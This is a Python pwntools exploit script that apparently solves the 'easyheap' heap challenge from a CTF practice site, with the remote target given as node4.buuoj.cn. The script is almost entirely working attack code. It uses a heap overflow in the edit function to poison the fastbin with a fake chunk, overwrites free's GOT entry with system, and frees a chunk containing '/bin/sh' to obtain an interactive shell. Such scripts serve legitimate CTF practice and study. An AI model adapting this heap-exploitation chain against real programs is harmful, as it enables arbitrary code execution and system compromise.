from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./easyheap"
libc_path = "/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"
ld_path = "/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([ld_path,vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node4.buuoj.cn", 27958)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def create(size, content):
    io.sendlineafter("choice :", "1")
    io.sendlineafter("Size of Heap : ", str(size))
    io.sendafter("Content of heap:", content)


def edit(index, content):
    io.sendlineafter("choice :", "2")
    io.sendlineafter("Index :", str(index))
    io.sendlineafter("Size of Heap : ", str(len(content)))
    io.sendafter("Content of heap : ", content)


def delete(index):
    io.sendlineafter("choice :", "3")
    io.sendlineafter("Index :", str(index))


create(0x60, "a")
create(0x60, "a") #1
create(0x60, "a")

delete(2)

"""
gef➤  x/10gx 0x6020ad
0x6020ad:       0x86c52908e0000000      0x000000000000007f
0x6020bd:       0x0000000000000000      0x0000000000000000

fastbin -> new fake chunk to 0x60ad -> overwrite chunk0 --> free.got
""" 
payload = b"/bin/sh\x00" + b"a"*0x58 + p64(0)+p64(0x71)+ p64(0x6020ad)
edit(1, payload) # fake chunk -> 0x6020ad

create(0x60, "a")
create(0x60, "a") #3 fake chunk

payload = b"a" * 0x23 + p64(elf.got["free"])
success("free -> " + hex(elf.got["free"]))
edit(3, payload)  # chunk0 -> free.got

payload = p64(elf.plt["system"])
edit(0, payload)  # free.got->system 

delete(1) # free->system("/bin/sh")

io.interactive()
